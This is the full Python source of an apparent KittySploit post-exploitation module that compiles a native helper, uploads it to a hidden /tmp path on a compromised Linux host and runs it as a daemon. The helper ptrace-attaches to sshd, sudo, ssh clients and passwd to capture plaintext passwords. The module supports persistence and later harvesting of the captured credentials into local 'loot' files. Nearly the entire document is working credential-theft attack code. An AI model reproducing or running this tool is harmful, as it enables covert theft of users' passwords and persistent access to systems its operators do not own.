#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import annotations

import os
import re
import shlex
import shutil
import subprocess
import tempfile
import time
from dataclasses import dataclass
from typing import List, Optional

from kittysploit import *
from core.lib.compiler.zig_compiler import ZigCompiler
from core.utils.paths import data_dir
from lib.post.linux.session import LinuxSessionMixin
from lib.post.linux.system import System

EVENT_BEGIN = "__KS_SNIFF_EVENT__"
EVENT_END = "__KS_SNIFF_END__"

_ARCH_MAP = {
    "x86_64": "x64",
    "amd64": "x64",
    "i386": "x86",
    "i686": "x86",
    "aarch64": "arm64",
    "arm64": "arm64",
}

_MUSL_TRIPLE = {
    "x64": "x86_64-linux-musl",
    "x86": "i386-linux-musl",
    "arm64": "aarch64-linux-musl",
}


@dataclass
class SniffEvent:
    ts: str
    user: str
    pid: str
    proc: str
    kind: str
    value: str


class Module(Post, System, LinuxSessionMixin):
    __info__ = {
        "name": "Linux Ptrace Auth Sniffer",
        "description": (
            "Cross-compile and deploy a native helper that listens for process "
            "events (netlink connector) and ptrace-attaches to sshd, sudo, ssh "
            "client/scp/sftp, and passwd flows to recover password-based "
            "authentication material from syscall buffers — without patching "
            "sshd or loading a kernel module. Supports persistent deployment "
            "and later harvest/stop/status actions. Requires root."
        ),
        "platform": Platform.LINUX,
        "author": ["KittySploit Team"],
        "session_type": [
            SessionType.SHELL,
            SessionType.METERPRETER,
            SessionType.SSH,
        ],
        "references": [
            "https://attack.mitre.org/techniques/T1056.001/",
            "https://man7.org/linux/man-pages/man2/ptrace.2.html",
        ],
        "tags": [
            "linux",
            "post",
            "gather",
            "credentials",
            "ptrace",
            "sshd",
            "sudo",
            "ssh",
            "passwd",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["credential_access", "active_exploitation"],
            "expected_requests": 6,
            "reversible": False,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "cost": 2.0,
            "noise": 0.85,
            "value": 1.5,
            "requires": {
                "capabilities_any": ["shell"],
                "capabilities_all": [],
            },
            "chain": {
                "consumes_capabilities": ["shell"],
                "produces_capabilities": [{"capability": "credentials", "from_detail": "live_sniff"}],
                "option_bindings": {},
                "suggested_followups": ["post/shell/linux/gather/gather_credentials"],
            },
        },
    }

    action = OptEnum(
        ["deploy", "harvest", "stop", "status"],
        "deploy=start sniffer; harvest=read OUTPUT_FILE; stop=kill; status=health",
        False,
        "deploy",
    )
    remote_bin = OptString(
        "/tmp/.ks_proc_auth_sniffer",
        "Remote path for the uploaded helper",
        required=False,
    )
    output_file = OptString(
        "/tmp/.ks_sniff_out.txt",
        "Remote file collecting captured events (daemon mode)",
        required=False,
    )
    pid_file = OptString(
        "/tmp/.ks_sniff.pid",
        "Remote PID file written by the helper",
        required=False,
    )
    collect_seconds = OptInteger(
        120,
        "Seconds to leave the sniffer running before harvesting output (daemon mode)",
        required=False,
    )
    daemon = OptBool(
        True,
        "Daemonize on target (recommended; output via OUTPUT_FILE)",
        required=False,
    )
    enable_ssh = OptBool(True, "Trace sshd password auth (PROC_EVENT_UID)", required=False)
    enable_sudo = OptBool(True, "Trace sudo password auth (PROC_EVENT_EXEC)", required=False)
    enable_ssh_client = OptBool(
        True,
        "Trace ssh/scp/sftp/ssh-add client password and passphrase prompts",
        required=False,
    )
    enable_passwd = OptBool(True, "Trace passwd password changes (stdin reads)", required=False)
    persist = OptBool(
        False,
        "Keep sniffer, binary and OUTPUT_FILE on target after deploy (skip teardown)",
        required=False,
    )
    force_redeploy = OptBool(
        False,
        "Stop an existing sniffer (PID_FILE) before deploy",
        required=False,
    )
    target_arch = OptString("auto", "Target arch: auto, x64, arm64", required=False)
    build_remote = OptBool(
        False,
        "Compile on target with gcc instead of Zig cross-build on operator host",
        required=False,
    )
    save_loot = OptBool(True, "Save harvested events under ./loot", required=False)
    cleanup = OptBool(True, "Stop sniffer and remove staged files", required=False)
    require_root = OptBool(True, "Refuse to run without uid 0", required=False)

    def check(self) -> bool:
        if not self.linux_require_linux():
            return False

        if bool(self.require_root) and not self.linux_is_root():
            print_error("Root (uid 0) is required — ptrace other users' auth flows.")
            return False

        if not self._any_tracer_enabled():
            print_error("Enable at least one tracer (SSH, SUDO, SSH_CLIENT, PASSWD).")
            return False

        proc_mounted = self.linux_execute("test -d /proc/1 && echo OK")
        if "OK" not in (proc_mounted or ""):
            print_error("/proc is not available on the target.")
            return False

        scope = (self.linux_execute("cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null") or "1").strip()
        line = scope.splitlines()[-1] if scope else "1"
        if line not in ("0", "2") and bool(self.require_root):
            print_warning(
                f"ptrace_scope={line} — attach may fail unless you are root and scope allows it."
            )

        arch = self._resolve_arch()
        if not arch:
            print_error("Could not resolve target architecture (set TARGET_ARCH).")
            return False
        print_status(f"Target architecture: {arch}")
        return True

    def run(self) -> bool:
        act = str(self.action or "deploy").strip().lower()
        remote_bin = str(self.remote_bin or "/tmp/.ks_proc_auth_sniffer").strip()
        out_file = str(self.output_file or "/tmp/.ks_sniff_out.txt").strip()
        pid_file = str(self.pid_file or "/tmp/.ks_sniff.pid").strip()

        if act == "status":
            return self._action_status(pid_file, out_file)
        if act == "stop":
            return self._action_stop(pid_file, remote_bin, out_file)
        if act == "harvest":
            if not self.linux_require_linux():
                return False
            return self._action_harvest(out_file, pid_file)

        if not self.check():
            return False

        arch = self._resolve_arch()
        if bool(self.force_redeploy):
            self._stop_sniffer(pid_file)

        existing = self._remote_pid(pid_file)
        if existing and not bool(self.force_redeploy):
            print_warning(
                f"Sniffer already running (pid {existing}). "
                "Use ACTION=harvest, ACTION=stop, or FORCE_REDEPLOY=true."
            )
            return self._action_harvest(out_file, pid_file)

        c_path = data_dir() / "helpers" / "linux" / "proc_auth_sniffer.c"
        if not c_path.is_file():
            print_error(f"Helper source missing: {c_path}")
            return False
        source = c_path.read_text(encoding="utf-8")

        if bool(self.build_remote):
            if not self._build_remote(source, remote_bin):
                return False
            print_success(f"Helper built on target: {remote_bin}")
        else:
            binary = self._build_binary(source, arch)
            if not binary:
                return False
            print_status(f"Uploading helper ({len(binary)} bytes) -> {remote_bin}")
            if not self.linux_upload_bytes(binary, remote_bin, executable=True):
                return False
            print_success(f"Helper staged: {remote_bin}")

        q_bin = self.linux_shell_quote(remote_bin)
        q_out = self.linux_shell_quote(out_file)
        q_pid = self.linux_shell_quote(pid_file)
        flag_s = self._cli_flags()

        teardown = bool(self.cleanup) and not bool(self.persist)

        try:
            if bool(self.daemon):
                self.linux_delete_remote([out_file, pid_file])
                start_cmd = (
                    f"nohup {q_bin} -d -o {q_out} -p {q_pid}{flag_s} "
                    f"</dev/null >/dev/null 2>&1 &"
                )
                print_status("Starting daemonized sniffer on target...")
                self.linux_execute(start_cmd)
                time.sleep(1)
                alive = self._remote_pid(pid_file)
                if not alive:
                    print_error("Sniffer did not write PID file — startup may have failed.")
                    return False
                print_success(f"Sniffer running (pid {alive})")

                wait_s = self.linux_int_opt(self.collect_seconds, 120, minimum=0)
                if wait_s > 0:
                    print_info(
                        f"Waiting {wait_s}s for authentications (ssh/sudo/passwd/ssh client)..."
                    )
                    time.sleep(wait_s)

                return self._action_harvest(out_file, pid_file, skip_wait=True)
            else:
                print_warning("Foreground mode blocks the session until timeout.")
                wait_s = self.linux_int_opt(self.collect_seconds, 60, minimum=5)
                fg_cmd = f"timeout {wait_s} {q_bin} -o {q_out} -p {q_pid}{flag_s}"
                raw = self.linux_execute(fg_cmd, timeout=wait_s + 30)
                if raw:
                    print_info(raw[:1500])
                return self._action_harvest(out_file, pid_file, skip_wait=True)
        finally:
            if teardown:
                self._stop_sniffer(pid_file)
                paths = [remote_bin, pid_file, remote_bin + ".c"]
                if bool(self.daemon):
                    paths.append(out_file)
                self.linux_delete_remote(paths)
            elif bool(self.persist):
                pid = self._remote_pid(pid_file)
                print_success(
                    f"Persistent sniffer left on target (pid={pid or '?'}, "
                    f"output={out_file}). Re-run with ACTION=harvest."
                )

    def _any_tracer_enabled(self) -> bool:
        return any(
            (
                bool(self.enable_ssh),
                bool(self.enable_sudo),
                bool(self.enable_ssh_client),
                bool(self.enable_passwd),
            )
        )

    def _cli_flags(self) -> str:
        flags = []
        if not bool(self.enable_ssh):
            flags.append("--no-ssh")
        if not bool(self.enable_sudo):
            flags.append("--no-sudo")
        if not bool(self.enable_ssh_client):
            flags.append("--no-ssh-client")
        if not bool(self.enable_passwd):
            flags.append("--no-passwd")
        return (" " + " ".join(flags)) if flags else ""

    def _remote_pid(self, pid_file: str) -> str:
        q = self.linux_shell_quote(pid_file)
        raw = (self.linux_execute(f"cat {q} 2>/dev/null") or "").strip()
        if not raw:
            return ""
        val = raw.splitlines()[-1].strip()
        return val if val.isdigit() else ""

    def _action_status(self, pid_file: str, out_file: str) -> bool:
        if not self.linux_require_linux():
            return False
        pid = self._remote_pid(pid_file)
        q_pid = self.linux_shell_quote(pid_file)
        q_out = self.linux_shell_quote(out_file)
        ptrace = (
            self.linux_execute("cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null") or "?"
        ).strip()
        size = self.linux_remote_file_size(out_file)
        if not pid:
            print_warning(f"No PID in {pid_file} (sniffer not deployed or stopped).")
            print_info(f"OUTPUT_FILE size: {size} bytes | ptrace_scope: {ptrace.splitlines()[-1]}")
            return False
        alive = self.linux_execute(f"kill -0 {pid} 2>/dev/null && echo OK")
        if "OK" in alive:
            print_success(f"Sniffer alive: pid {pid}")
        else:
            print_error(f"Stale PID file {pid} — process not running.")
        print_info(f"Output file {out_file}: {size} bytes")
        tail = self.linux_execute(f"tail -n 8 {q_out} 2>/dev/null")
        if tail:
            print_info("--- tail OUTPUT_FILE ---")
            print_info(tail[:2500])
        print_info(f"ptrace_scope={ptrace.splitlines()[-1]}")
        return "OK" in alive

    def _action_stop(self, pid_file: str, remote_bin: str, out_file: str) -> bool:
        if not self.linux_require_linux():
            return False
        pid = self._remote_pid(pid_file)
        if pid:
            self._stop_sniffer(pid_file)
        paths = [remote_bin, pid_file, remote_bin + ".c", out_file]
        if bool(self.cleanup):
            self.linux_delete_remote(paths)
            print_success("Sniffer stopped and artifacts removed.")
        else:
            print_success("Sniffer stopped (artifacts kept — set CLEANUP=true to delete).")
        return True

    def _action_harvest(
        self, out_file: str, pid_file: str, *, skip_wait: bool = False
    ) -> bool:
        if not skip_wait:
            wait_s = self.linux_int_opt(self.collect_seconds, 0, minimum=0)
            if wait_s > 0:
                print_info(f"Waiting {wait_s}s before harvest...")
                time.sleep(wait_s)
        payload = self._harvest_output(out_file)
        if not payload.strip():
            print_warning("No events in output file yet.")
            return False
        events = self._parse_events(payload)
        self._present(events)
        if bool(self.save_loot):
            self._save_loot(payload, events)
        if self._remote_pid(pid_file):
            print_info("Sniffer still running on target.")
        return bool(events)

    def _resolve_arch(self) -> str:
        requested = str(self.target_arch or "auto").strip().lower()
        if requested and requested != "auto":
            return requested
        raw = (self.linux_execute("uname -m 2>/dev/null") or "").strip().lower()
        token = raw.splitlines()[-1].strip() if raw else ""
        return _ARCH_MAP.get(token, "")

    def _build_binary(self, source: str, arch: str) -> Optional[bytes]:
        return self._build_zig(source, arch) or self._build_local_gcc(source)

    def _build_zig(self, source: str, arch: str) -> Optional[bytes]:
        triple = _MUSL_TRIPLE.get(arch)
        if not triple:
            print_error(f"Unsupported arch for Zig build: {arch}")
            return None
        compiler = ZigCompiler()
        if not compiler.is_available():
            return None

        with tempfile.TemporaryDirectory(prefix="ks_sniff_") as tmp:
            src = os.path.join(tmp, "proc_auth_sniffer.c")
            out = os.path.join(tmp, "proc_auth_sniffer")
            with open(src, "w", encoding="utf-8") as handle:
                handle.write(source)
            env = os.environ.copy()
            env.setdefault("ZIG_LOCAL_CACHE_DIR", os.path.join(tmp, "zig-cache"))
            env.setdefault("ZIG_GLOBAL_CACHE_DIR", os.path.join(tmp, "zig-global"))
            cmd = [
                compiler.zig_path,
                "cc",
                "-target",
                triple,
                src,
                "-o",
                out,
                "-static",
                "-Os",
                "-s",
            ]
            print_status(f"Zig cross-compile ({triple})...")
            try:
                result = subprocess.run(cmd, env=env, capture_output=True, text=True, timeout=180)
            except Exception as exc:
                print_warning(f"Zig build error: {exc}")
                return None
            if result.returncode != 0 or not os.path.isfile(out):
                err = (result.stderr or result.stdout or "").strip()
                print_warning(f"Zig build failed: {err[:1200]}")
                return None
            with open(out, "rb") as handle:
                return handle.read()

    def _build_local_gcc(self, source: str) -> Optional[bytes]:
        if not shutil.which("gcc"):
            return None
        with tempfile.TemporaryDirectory(prefix="ks_sniff_gcc_") as tmp:
            src = os.path.join(tmp, "proc_auth_sniffer.c")
            out = os.path.join(tmp, "proc_auth_sniffer")
            with open(src, "w", encoding="utf-8") as handle:
                handle.write(source)
            cmd = f"gcc -static -Os -o {shlex.quote(out)} {shlex.quote(src)}"
            print_status("Local gcc static build...")
            if os.system(cmd) != 0 or not os.path.isfile(out):
                print_error("Local gcc build failed")
                return None
            with open(out, "rb") as handle:
                return handle.read()

    def _build_remote(self, source: str, remote_bin: str) -> bool:
        if not self.linux_command_exists("gcc"):
            print_error("gcc not found on target (BUILD_REMOTE)")
            return False
        remote_c = remote_bin + ".c"
        if not self.linux_upload_bytes(source.encode("utf-8"), remote_c, executable=False):
            return False
        q_c = self.linux_shell_quote(remote_c)
        q_out = self.linux_shell_quote(remote_bin)
        cmd = f"gcc -static -Os -o {q_out} {q_c} 2>&1"
        out = self.linux_execute(cmd)
        if not self.linux_file_exists(remote_bin):
            print_error(f"Remote compile failed: {(out or '')[:1200]}")
            return False
        size = self.linux_remote_file_size(remote_bin)
        print_success(f"Remote build OK ({size} bytes)")
        self.linux_execute(f"chmod +x {q_out}")
        return True

    def _harvest_output(self, remote_path: str) -> str:
        q = self.linux_shell_quote(remote_path)
        if self.linux_remote_file_size(remote_path) > 0:
            body = self.linux_execute(f"cat {q} 2>/dev/null")
            return body or ""
        print_warning(f"No output at {remote_path}")
        return ""

    def _stop_sniffer(self, pid_file: str) -> None:
        q = self.linux_shell_quote(pid_file)
        pid = (self.linux_execute(f"cat {q} 2>/dev/null") or "").strip().splitlines()
        if not pid:
            return
        val = pid[-1].strip()
        if val.isdigit():
            self.linux_execute(f"kill {val} 2>/dev/null")
            print_status(f"Stopped sniffer pid {val}")

    @staticmethod
    def _parse_events(blob: str) -> List[SniffEvent]:
        events: List[SniffEvent] = []
        parts = blob.split(EVENT_BEGIN)
        for block in parts[1:]:
            end = block.find(EVENT_END)
            if end < 0:
                continue
            section = block[:end]
            fields = {}
            for line in section.splitlines():
                if "=" not in line:
                    continue
                key, _, val = line.partition("=")
                fields[key.strip()] = val.strip()
            if fields.get("value"):
                events.append(
                    SniffEvent(
                        ts=fields.get("ts", ""),
                        user=fields.get("user", ""),
                        pid=fields.get("pid", ""),
                        proc=fields.get("proc", ""),
                        kind=fields.get("kind", "password"),
                        value=fields.get("value", ""),
                    )
                )
        return events

    def _present(self, events: List[SniffEvent]) -> None:
        print_success(f"Captured {len(events)} event(s)")
        for ev in events:
            print_info(
                f"[{ev.user} pid={ev.pid}] {ev.proc} ({ev.kind}) -> {ev.value}"
            )

    def _save_loot(self, raw: str, events: List[SniffEvent]) -> None:
        host = (self.linux_execute("hostname 2>/dev/null") or "linux").strip()
        host = host.splitlines()[-1].strip() if host else "linux"
        safe = re.sub(r"[^a-zA-Z0-9._-]+", "_", host) or "linux"
        stamp = int(time.time())
        rel = os.path.join("loot", f"proc_auth_sniffer_{safe}_{stamp}.txt")
        path = self.output_dir_path(rel)
        try:
            parent = os.path.dirname(path)
            if parent:
                os.makedirs(parent, exist_ok=True)
            with open(path, "w", encoding="utf-8") as handle:
                handle.write(raw)
            if events:
                ev_path = path + ".events"
                with open(ev_path, "w", encoding="utf-8") as ev_handle:
                    for ev in events:
                        ev_handle.write(
                            f"ts={ev.ts} user={ev.user} pid={ev.pid} "
                            f"proc={ev.proc} kind={ev.kind} secret={ev.value}\n"
                        )
            print_success(f"Loot saved: {path}")
        except OSError as exc:
            print_warning(f"Could not save loot: {exc}")
